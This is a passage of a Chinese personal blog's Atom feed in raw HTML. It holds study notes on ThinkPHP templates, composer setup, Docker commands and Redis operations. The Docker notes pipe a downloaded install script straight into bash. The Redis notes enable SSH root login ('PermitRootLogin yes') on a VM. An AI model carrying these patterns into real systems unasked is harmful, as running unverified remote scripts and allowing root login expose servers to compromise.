class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;foreach $users as $key=&gt;$user&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;$key&#125;:&#123;$user['name']&#125;--&#123;$user['age']&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;/foreach&#125;</span><br><span class="line"></span><br><span class="line">&#123;volist name="users" id="user"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;$key&#125;:&#123;$user['name']&#125;--&#123;$user['age']&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;/volist&#125;</span><br></pre></td></tr></table></figure></li><li><p>判断</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;if (条件)&#125;</span><br><span class="line">...</span><br><span class="line">&#123;/if&#125;</span><br></pre></td></tr></table></figure></li><li><p>其他内置标签</p></li></ul><table><thead><tr><th>标签名</th><th>作用</th><th>包含属性</th></tr></thead><tbody><tr><td>include</td><td>包含外部模板文件（闭合）</td><td>file</td></tr><tr><td>load</td><td>导入资源文件（闭合 包括js css import别名）</td><td>file,href,type,value,basepath</td></tr><tr><td>volist</td><td>循环数组数据输出</td><td>name,id,offset,length,key,mod</td></tr><tr><td>foreach</td><td>数组或对象遍历输出</td><td>name,item,key</td></tr><tr><td>for</td><td>For循环数据输出</td><td>name,from,to,before,step</td></tr><tr><td>switch</td><td>分支判断输出</td><td>name</td></tr><tr><td>case</td><td>分支判断输出（必须和switch配套使用）</td><td>value,break</td></tr><tr><td>default</td><td>默认情况输出（闭合 必须和switch配套使用）</td><td>无</td></tr><tr><td>compare</td><td>比较输出（包括eq neq lt gt egt elt heq nheq等别名）</td><td>name,value,type</td></tr><tr><td>range</td><td>范围判断输出（包括in notin between notbetween别名）</td><td>name,value,type</td></tr><tr><td>present</td><td>判断是否赋值</td><td>name</td></tr><tr><td>notpresent</td><td>判断是否尚未赋值</td><td>name</td></tr><tr><td>empty</td><td>判断数据是否为空</td><td>name</td></tr><tr><td>notempty</td><td>判断数据是否不为空</td><td>name</td></tr><tr><td>defined</td><td>判断常量是否定义</td><td>name</td></tr><tr><td>notdefined</td><td>判断常量是否未定义</td><td>name</td></tr><tr><td>define</td><td>常量定义（闭合）</td><td>name,value</td></tr><tr><td>assign</td><td>变量赋值（闭合）</td><td>name,value</td></tr><tr><td>if</td><td>条件判断输出</td><td>condition</td></tr><tr><td>elseif</td><td>条件判断输出（闭合 必须和if标签配套使用）</td><td>condition</td></tr><tr><td>else</td><td>条件不成立输出（闭合 可用于其他标签）</td><td>无</td></tr><tr><td>php</td><td>使用php代码</td><td>无</td></tr></tbody></table><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><p><code>{block} {/block}</code>组成区块，子模板可以对区块进行重载</p><ul><li><p>base.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;block name="menu"&#125;菜单&#123;/block&#125;</span><br><span class="line">&#123;block name="footer"&#125;底部&#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>子模板:index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;extend name="base" /&#125;</span><br><span class="line"></span><br><span class="line">&#123;block name="menu"&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span> &gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/home/"</span> &gt;</span>主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/about/"</span> &gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">&#123;/block&#125;</span><br><span class="line">&#123;block name="footer"&#125;</span><br><span class="line">&#123;__block__&#125;合并</span><br><span class="line">&#123;/block&#125;</span><br></pre></td></tr></table></figure></li></ul><p>在子模板中，可以对基础模板中的区块进行重载定义，如果没有重新定义的话，则表示沿用基础模板中的区块定义，如果定义了一个空的区块，则表示删除基础模板中的该区块内容。<code>{__block__}</code>这个标签，当区块中有这个标记时，就不只是直接重载这个区块，它表示引用所继承模板对应区块的内容到这个位置，最终这个区块是合并后的内容。所以显示的是<code>底部合并</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;composer&quot;&gt;&lt;a href=&quot;#composer&quot; class=&quot;headerlink&quot; title=&quot;composer&quot;&gt;&lt;/a&gt;composer&lt;/h2&gt;&lt;p&gt;因为我用的是phpstudy，首先要切换到php7以上要安装vc14，结果安装失败，原因是因为我安装了VS2017，然后我就有了VC2017的版本，我在控制面板把64版本的VC2017卸载，然后重新安装vc14成功。phpstudy2016自带composer1.2版本，开启openssl扩展，执行composer self-update报错:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Updating to version 1.8.6 (stable channel).&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    Downloading: 100%&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [RuntimeException]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  SHA384 is not supported by your openssl extension, could not verify the phar file integrity&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;我就只好自己安装了&lt;a href=&quot;https://getcomposer.org/download/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;地址&lt;/a&gt;，安装里填的是7.2版本的php.exe，因为6.0版本的tp只支持7.1以上的php。&lt;/p&gt;
&lt;h2 id=&quot;安装框架&quot;&gt;&lt;a href=&quot;#安装框架&quot; class=&quot;headerlink&quot; title=&quot;安装框架&quot;&gt;&lt;/a&gt;安装框架&lt;/h2&gt;&lt;p&gt;切换到WWW目录，安装tp框架&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;composer create-project topthink/think tp6 6.0.*-dev&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;测试执行，进入到tp6文件夹下，执行&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;php think run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;访问127.0.0.1::8000，可以看到欢迎界面。&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="php" scheme="http://chenxiyuan.vip/tags/php/"/>
    
      <category term="thinkphp" scheme="http://chenxiyuan.vip/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>docker笔记</title>
    <link href="http://chenxiyuan.vip/2019/07/18/docker%E7%AC%94%E8%AE%B0/"/>
    <id>http://chenxiyuan.vip/2019/07/18/docker笔记/</id>
    <published>2019-07-18T09:22:12.000Z</published>
    <updated>2019-07-28T08:11:35.552Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>ubuntu使用官方脚本自动安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure></p><h2 id="加入用户组"><a href="#加入用户组" class="headerlink" title="加入用户组"></a>加入用户组</h2><ul><li><p>创建docker用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker</span><br></pre></td></tr></table></figure></li><li><p>加入docker用户组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker $&#123;USER&#125;</span><br></pre></td></tr></table></figure></li><li><p>重启docker服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure></li><li><p>切换或者退出当前账户再从新登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root             切换到root用户</span><br><span class="line">su $&#123;USER&#125;          再切换到原来的应用用户以上配置才生效</span><br></pre></td></tr></table></figure></li></ul><h2 id="docker镜像加速器"><a href="#docker镜像加速器" class="headerlink" title="docker镜像加速器"></a>docker镜像加速器</h2><p><a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors" target="_blank" rel="noopener">阿里云镜像加速器</a></p><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><ul><li><p>列出本机所有image文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image ls</span><br></pre></td></tr></table></figure></li><li><p>删除image文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image rm [imageName]</span><br></pre></td></tr></table></figure></li></ul><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><ul><li><p>先pull一个镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull training/webapp</span><br></pre></td></tr></table></figure></li><li><p>产生一个容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P training/webapp python app.py</span><br><span class="line">#-d:让容器在后台运行。</span><br><span class="line">#-P:将容器内部使用的网络端口映射到我们使用的主机上。</span><br></pre></td></tr></table></figure></li><li><p>列出[所有]容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps [-a]</span><br><span class="line">#CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS                     NAMES</span><br><span class="line">#43c2ddf7ba86        training/webapp     &quot;python app.py&quot;     7 minutes ago       Up 7 minutes        0.0.0.0:32768-&gt;5000/tcp   relaxed_jepsen</span><br><span class="line">#现在访问192.168.91.134:32768，就可以看到hello world</span><br></pre></td></tr></table></figure></li><li><p>也可以自己指定端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 5000:5000 training/webapp python app.py</span><br></pre></td></tr></table></figure></li><li><p>查看 WEB 应用程序日志<br>docker logs [ID或者名字] 可以查看容器内部的标准输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker logs 8b64b668a789</span><br><span class="line">Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)</span><br><span class="line">192.168.91.1 - - [18/Jul/2019 10:38:28] &quot;GET / HTTP/1.1&quot; 200 -</span><br><span class="line">192.168.91.1 - - [18/Jul/2019 10:38:28] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -</span><br><span class="line">#使用docker logs -f 8b64b668a789，可以持续查看日志</span><br></pre></td></tr></table></figure></li><li><p>查看WEB应用程序容器的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker top 8b64b668a789</span><br><span class="line">#UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">#root                15091               15063               0                   18:36               ?                   00:00:00            python app.py</span><br></pre></td></tr></table></figure></li><li><p>停用并删除所用容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h2&gt;&lt;p&gt;ubuntu使用官方脚本自动安装&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
      <category term="杂项" scheme="http://chenxiyuan.vip/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="docker" scheme="http://chenxiyuan.vip/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>redis学习</title>
    <link href="http://chenxiyuan.vip/2019/07/17/redis%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/17/redis学习/</id>
    <published>2019-07-17T03:33:49.000Z</published>
    <updated>2019-07-18T09:25:14.151Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li><code>redis</code>:<code>REmote DIctionary Server</code>是一种<code>nosql</code>数据库，它的数据是保存在内存中，同时<code>redis</code>可以定时把内存数据同步到磁盘，即可以将数据持久化，并且它比<code>memcached</code>支持更多的数据结构<code>(string,list列表[队列和栈],set[集合],sorted set[有序集合],hash(hash表))</code></li><li>更多命令可以查看<a href="http://redisdoc.com/index.html" target="_blank" rel="noopener">REDIS文档</a></li></ul><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>kali: <code>apt-get install redis-server</code></li><li>启动: <code>service redis-server start</code></li><li>查看: <code>ps aux|grep redis</code></li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ul><li>连接:<code>redis-cli -h[ip] -p[port]</code><h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3></li><li><p>添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set key value</span><br><span class="line">set username chenxiyuan</span><br><span class="line">set website &quot;chenxiyuan.vip&quot;</span><br><span class="line"># 默认过期时间永久。如果ket已经有其他值，则直接覆盖，无视其类型</span><br></pre></td></tr></table></figure></li><li><p>删除: <code>del key</code></p></li><li><p>设置过期时间:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">expire key seconds</span><br><span class="line"># 也可以在设置值得时候指定</span><br><span class="line">set key value EX seconds</span><br><span class="line">setex key seco value</span><br></pre></td></tr></table></figure></li><li><p>查看过期时间:<code>ttl key</code></p></li><li>查看所有的key:<code>keys *</code><h3 id="列表操作"><a href="#列表操作" class="headerlink" title="列表操作"></a>列表操作</h3></li><li><p>在列表左边添加元素:即插入表头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpush key value</span><br></pre></td></tr></table></figure></li><li><p>在列表右边添加元素:即插入表尾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpush key value</span><br></pre></td></tr></table></figure></li><li><p>查看列表中的元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lrange key start stop</span><br><span class="line">#查看所有元素</span><br><span class="line">lrange key 0 -1</span><br></pre></td></tr></table></figure></li><li><p>移除列表中的元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#移除并返回列表的头元素</span><br><span class="line">lpop key</span><br><span class="line">#移除并返回列表的尾元素</span><br><span class="line">rpop key</span><br><span class="line">#移除并返回列表的中间元素</span><br><span class="line">lrem key count value</span><br><span class="line">#count&gt;0:删除从表头开始的count个value</span><br><span class="line">#count&lt;0:删除从表尾开始的|count|个value</span><br><span class="line">#count=0:删除表中所有的value</span><br></pre></td></tr></table></figure></li><li><p>指定返回第几个元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lindex key index</span><br></pre></td></tr></table></figure></li><li><p>获取列表的长度:<code>llen key</code></p><h3 id="set集合操作"><a href="#set集合操作" class="headerlink" title="set集合操作:"></a>set集合操作:</h3></li><li><p>添加元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sadd key member [member ...]</span><br><span class="line">sadd students xiaohong xiaoming</span><br></pre></td></tr></table></figure></li><li><p>查看集合中的元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smembers key</span><br></pre></td></tr></table></figure></li><li><p>查看集合中元素个数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scard key</span><br></pre></td></tr></table></figure></li><li><p>移除元素:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">srem key member [member ...]</span><br></pre></td></tr></table></figure></li><li><p>获取多个集合的交集:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sinter key [key ...]</span><br><span class="line"># sadd class1 xiaohong xiaobai xiaoming </span><br><span class="line"># sadd class2 xiaobai xiaole xiaohong xiaotian</span><br><span class="line"># sinter class1 class2</span><br><span class="line"># 1) &quot;xiaobai&quot; 2) &quot;xiaohong&quot;</span><br></pre></td></tr></table></figure></li><li><p>获取多个集合的并集:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sunion key [key ...]</span><br></pre></td></tr></table></figure></li><li><p>获取多个集合的差集:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sdiff key [key ...]</span><br><span class="line"># sdiff class1 class2</span><br><span class="line"># 1) &quot;xiaoming&quot;</span><br><span class="line"># sdiff class2 class1</span><br><span class="line"># 1) &quot;xiaole&quot;</span><br><span class="line"># 2) &quot;xiaotian&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="hash哈希操作"><a href="#hash哈希操作" class="headerlink" title="hash哈希操作:"></a>hash哈希操作:</h3><ul><li><p>添加一个新值:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hset key field value</span><br><span class="line">#hset blog chenxiyuan chenxiyuan.vip</span><br></pre></td></tr></table></figure></li><li><p>获取hash中的field对应的value:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hget key field</span><br></pre></td></tr></table></figure></li><li><p>删除field:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdel key field [field ...]</span><br></pre></td></tr></table></figure></li><li><p>获取hash中的所有field和value:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgetall key</span><br></pre></td></tr></table></figure></li><li><p>获取hash中所有键:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hkeys key</span><br></pre></td></tr></table></figure></li><li><p>获取hash中所有值:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hvals key</span><br></pre></td></tr></table></figure></li><li><p>获取hash键值对数量:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hlen key</span><br></pre></td></tr></table></figure></li></ul><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><ul><li><code>multi</code>: 标记一个事务块的开始。事务块内的多条命令会按照先后顺序被放进一个队列当中，最后由 EXEC 命令原子性(atomic)地执行。</li><li><code>exec</code>: 执行所有事务块内的命令。假如某个(或某些) key 正处于 WATCH 命令的监视之下，且事务块中有和这个(或这些) key 相关的命令，那么 EXEC 命令只在这个(或这些) key 没有被其他命令所改动的情况下执行并生效，否则该事务被打断(abort)。</li><li><code>discard</code>: 取消事务，放弃执行事务块内的所有命令。<br>如果正在使用 WATCH 命令监视某个(或某些) key，那么取消所有监视，等同于执行命令 UNWATCH 。</li><li><code>watch</code>: 监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。</li><li><code>unwatch</code>: 取消 WATCH 命令对所有 key 的监视。<br>如果在执行 WATCH 命令之后， EXEC 命令或 DISCARD 命令先被执行了的话，那么就不需要再执行 UNWATCH 了。<br>因为 EXEC 命令会执行事务，因此 WATCH 命令的效果已经产生了；而 DISCARD 命令在取消事务的同时也会取消所有对 key 的监视，因此这两个命令执行之后，就没有必要执行 UNWATCH 了。</li></ul><h2 id="发布和订阅操作"><a href="#发布和订阅操作" class="headerlink" title="发布和订阅操作"></a>发布和订阅操作</h2><ol><li>我用的是kali,然后再用xshell连接kali虚拟机，也用redis-cli连接上。<br>注:用xshell连接kali，需要执行以下操作<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure></li></ol><p>将<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">#LoginGraceTime 2m</span><br><span class="line">#PermitRootLogin prohibit-password</span><br><span class="line">#StrictModes yes</span><br><span class="line">#MaxAuthTries 6</span><br><span class="line">#MaxSessions 10</span><br></pre></td></tr></table></figure></p><p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Authentication:</span><br><span class="line">LoginGraceTime 2m</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">StrictModes yes</span><br><span class="line">MaxAuthTries 6</span><br><span class="line">MaxSessions 10</span><br></pre></td></tr></table></figure></p><p>重启ssh服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure></p><p>设置ssh服务开机自启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable</span><br></pre></td></tr></table></figure></p><ol start="2"><li><p>kali虚拟机订阅频道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#subscribe channel [channel ...]</span><br><span class="line">subscribe chatroom</span><br></pre></td></tr></table></figure></li><li><p>xshell发布一个消息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#publish channel message</span><br></pre></td></tr></table></figure></li></ol><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><ul><li><code>redis</code>提供了两种数据备份方式，一种是<code>RDB</code>，另外一种是<code>AOF</code>:</li></ul><table><thead><tr><th></th><th>RDB</th><th>AOF</th></tr></thead><tbody><tr><td>开启关闭</td><td>开启：默认开启。关闭：把配置文件中所有的save都注释，就是关闭了。</td><td>开启：在配置文件中appendonly yes即开启了aof，为no关闭。</td></tr><tr><td>同步机制</td><td>可以指定某个时间内发生多少个命令进行同步。比如1分钟内发生了2次命令，就做一次同步。</td><td>每秒同步或者每次发生命令后同步</td></tr><tr><td>存储内容</td><td>存储的是redis里面的具体的值</td><td>存储的是执行的更新数据的操作命令</td></tr><tr><td>存储文件的路径</td><td>根据dir以及dbfilename来指定路径和具体的文件名</td><td>根据dir以及appendfilename来指定具体的路径和文件名</td></tr><tr><td>优点</td><td>（1）存储数据到文件中会进行压缩，文件体积比aof小。（2）因为存储的是redis具体的值，并且会经过压缩，因此在恢复的时候速度比AOF快。（3）非常适用于备份。</td><td>（1）AOF的策略是每秒钟或者每次发生写操作的时候都会同步，因此即使服务器故障，最多只会丢失1秒的数据。 （2）AOF存储的是Redis命令，并且是直接追加到aof文件后面，因此每次备份的时候只要添加新的数据进去就可以了。（3）如果AOF文件比较大了，那么Redis会进行重写，只保留最小的命令集合。</td></tr><tr><td>缺点</td><td>（1）RDB在多少时间内发生了多少写操作的时候就会出发同步机制，因为采用压缩机制，RDB在同步的时候都重新保存整个Redis中的数据，因此你一般会设置在最少5分钟才保存一次数据。在这种情况下，一旦服务器故障，会造成5分钟的数据丢失。（2）在数据保存进RDB的时候，Redis会fork出一个子进程用来同步，在数据量比较大的时候，可能会非常耗时。</td><td>（1）AOF文件因为没有压缩，因此体积比RDB大。 （2）AOF是在每秒或者每次写操作都进行备份，因此如果并发量比较大，效率可能有点慢。（3）AOF文件因为存储的是命令，因此在灾难恢复的时候Redis会重新运行AOF中的命令，速度不及RDB。</td></tr><tr><td>更多</td><td><a href="http://redisdoc.com/topic/persistence.html#redis" target="_blank" rel="noopener">http://redisdoc.com/topic/persistence.html#redis</a></td></tr></tbody></table><h2 id="客户端与服务器"><a href="#客户端与服务器" class="headerlink" title="客户端与服务器"></a>客户端与服务器</h2><h3 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h3><ol><li><p>设置临时密码<br>redis连接后，输入命令<code>CONFIG SET requirepass password</code>可以使用密码来保护 Redis 服务器。示例代码:</p><figure 